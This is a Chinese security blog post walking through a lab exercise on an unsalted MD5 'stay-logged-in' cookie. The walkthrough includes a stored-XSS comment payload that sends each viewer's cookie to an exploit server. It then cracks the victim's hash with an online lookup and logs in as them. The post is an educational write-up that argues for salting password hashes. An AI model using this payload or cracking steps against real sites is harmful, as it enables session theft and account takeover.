#  【登录背后的秘密-第六章第二节】什么！Stay-logged-in Cookie没加盐？还有XSS漏洞？那我就不客气了  
原创 升斗安全XiuXiu
                    升斗安全XiuXiu  升斗安全   2026-04-12 23:56  
  
**【文章说明】**  
- **目的**  
：本文内容仅为网络安全**技术研究与教育**  
目的而创作。  
  
- **红线**  
：严禁将本文知识用于任何**未授权**  
的非法活动。使用者必须遵守《网络安全法》等相关法律。  
  
- **责任**  
：任何对本文技术的滥用所引发的**后果自负**  
，与本公众号及作者无关。  
  
- **免责**  
：内容仅供参考，作者不对其准确性、完整性作任何担保。  
  
**阅读即代表您同意以上条款。**  
  
****  
你有没有想过，在某些极端情况下，攻击者能直接从  
Cookie里捞出你的明文密码？本文通过一个有趣的实验，带你一步步复现这个过程——  
从XSS漏洞窃取Cookie，到利用搜索引擎“反查”哈希值，最后成功登录并删除受害者账户。整个过程既像侦探破案，又像黑客版的“寻宝游戏”。读完你会发现，加盐这件事，真的不能偷懒。  
  
开头先讲个“离谱”的真实情况  
  
在某些罕见的场景下，即便密码被哈希处理了，攻击者依然有可能从Cookie里直接拿到明文密码。  
  
为啥？因为网上随便一搜就能找到常见密码的哈希对照表。如果用户恰好用了那种“烂大街”的密码，你把哈希值往搜索引擎里一贴——好家伙，答案直接糊你脸上。  
  
这也解释了为啥在正经的加密机制里，  
加盐这件事儿，比上班打卡还重要。  
  
废话不多说，我们直接上实操案例！  
  
第一步：用自己的账号探路  
  
开着Burp，登录你自己的账号，顺手勾选“保持登录”功能。  
  
留意那个叫   
stay-logged-in 的Cookie，它看起来像一串乱码——其实是  
Base64编码过的。  
  
第二步：解剖Cookie的结构  
  
在Burp的 Proxy > HTTP history 里，找到登录请求对应的响应包，高亮选中那个Cookie，你会发现它的真身长这样：  
  
用户名 + ':' + 密码的MD5哈希值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGHoRpCWD3QqkpWoHJiaQE4p3FqW6ShicpIpqxPRQ2SqqzKdViaA9fM49Licn3hJ13VwBibsHFibvbcukHEZeiacJXmBM0GKd8Ct6icLZNw/640?wx_fmt=png&from=appmsg "")  
  
没错，就是这么简单粗暴。  
  
第三步：XSS偷家  
  
目标用户的Cookie怎么搞到手？巧了，评论区有个存储型XSS漏洞。  
  
我们只需要发一条评论，内容如下（记得把里面的ID换成你自己的漏洞利用服务器ID）：  
```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```  
  
这行代码的意思很简单：谁看了这条评论，谁的  
Cookie就被偷偷发到你的服务器上。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGHhntrDvvUX9wqGXyUmVB5LLzqwjBlvff1yOaAd2icVo4Xu53Up2RuBbXXRrhH4fUiakFEwuBZOkBqPI8x395Pn7ArJZSqpYDkbQ/640?wx_fmt=png&from=appmsg "")  
  
第四步：坐等猎物上钩  
  
回到你的漏洞利用服务器，打开访问日志。  
  
过一会儿，你应该能看到一条来自受害者的GET请求，路径里明晃晃地带着他的 stay-logged-in Cookie。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGGRyQHZx3CiaDu66Ga2usich7rxpja3y4NcUx52quL8PBZe7zicxbSSjicSYCgEub7McC60xKxcoSz2ibUO7DlCF7zz7kWBSF6U9ETM/640?wx_fmt=png&from=appmsg "")  
  
第五步：解码，然后“搜索引擎大法”  
  
把偷来的Cookie丢进Burp Decoder解码，你会得到类似这样的东西：  
  
carlos:26323c16d5f4dabff3bb136f2460a943  
  
复制哈希值   
26323c16d5f4dabff3bb136f2460a943，粘贴到哈希解码工具中。  
  
奇迹发生了——解码结果告诉你：密码是   
onceuponatime。  
  
第六步：收尾工作  
  
拿着账号 carlos 和密码 onceuponatime 登录，进到“我的账户”页面，收工。  
  
一个小小但重要的提醒  
  
这个案例是演示离线破解密码的潜在风险。在一些场景中，攻击者多半会用   
hashcat 之类的专业工具去跑字典，所以要结合实际的系统内容来选择靠谱的工具。  
  
安全无小事，尤其是密码存储这一块。一个小小的“  
加盐”动作，就能让上面这套攻击手法彻底失效。  
  
如果你觉得这篇文章有意思，或者想了解更多渗透测试的骚操作，欢迎关注、点赞、分享三连～  
  
评论区聊聊：你还见过哪些离谱的Cookie设计？  
  
  
